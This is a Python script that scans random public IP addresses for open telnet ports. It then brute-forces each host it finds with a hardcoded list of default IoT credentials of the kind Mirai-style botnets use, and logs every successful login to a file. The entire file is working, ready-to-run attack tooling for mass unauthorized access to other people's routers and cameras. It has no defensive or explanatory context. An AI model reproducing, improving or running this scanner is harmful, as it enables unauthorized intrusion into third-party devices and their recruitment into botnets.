import threading
import sys, os, re, time, socket, random
from sys import stdout

if len(sys.argv) < 3:
    print("Usage: python " + sys.argv[0] + " <threads> <output file>")
    sys.exit()

combo = [ 
    "support:support",
    "root:vizxv",
    "root:xc3511",
    "telnet:telnet",
    "root:root",
    "supervisor:zyad1234",
    "root:",
    "admin:1234",
    "user:user", 
    "root:antslq", 
    "admin:admin",
    "root:5up"
]

threads = int(sys.argv[1])
output_file = sys.argv[2]

def readUntil(tn, string, timeout=8):
    buf = b''
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            buf += tn.recv(1024)
            time.sleep(0.01)
            if string.encode() in buf:
                return buf.decode(errors='ignore')
        except:
            break
    raise Exception('TIMEOUT!')

def Gen_IP():
    not_valid = [10,127,169,172,192]
    first = random.randrange(1, 256)
    while first in not_valid:
        first = random.randrange(1, 256)
    ip = "{}".format(".".join(map(str, [first, random.randrange(1,256),
                                          random.randrange(1,256), random.randrange(1,256)])))
    return ip

class Router(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    
    def run(self):
        for passwd in combo:
            username, password = passwd.split(":") if ":" in passwd else (passwd, "")
            try:
                tn = socket.socket()
                tn.settimeout(8)
                tn.connect((self.ip, 23))
            except:
                tn.close()
                break
            
            try:
                hoho = readUntil(tn, "ogin:")
                if "ogin" in hoho:
                    tn.send((username + "\n").encode())
                    time.sleep(0.09)
            except:
                tn.close()
                continue
            
            try:
                hoho = readUntil(tn, "assword:")
                if "assword" in hoho:
                    tn.send((password + "\n").encode())
                    time.sleep(0.8)
            except:
                tn.close()
                continue
            
            try:
                prompt = tn.recv(40960).decode(errors='ignore')
                success = any(c in prompt for c in [">", "#", "$", "%", "@"]) and "ONT" not in prompt
                if success:
                    with open(output_file, "a") as f:
                        f.write(f"{self.ip}:23 {username}:{password}\n")
                    print(f"\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m{username}\033[37m:\033[33m{password}\033[37m:\033[32m{self.ip}\033[37m")
                    tn.close()
                    break
                else:
                    tn.close()
            except:
                tn.close()

def HaxThread():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            IP = Gen_IP()
            s.connect((IP, 23))
            s.close()
            print(f"\033[32m[\033[31m+\033[32m] FOUND {IP}")
            thread = Router(IP)
            thread.start()
        except:
            pass

if __name__ == "__main__":
    threadcount = 0
    for _ in range(threads):
        try:
            threading.Thread(target=HaxThread, args=()).start()
            threadcount += 1
        except:
            pass
    print(f"[*] Started {threadcount} scanner threads!")
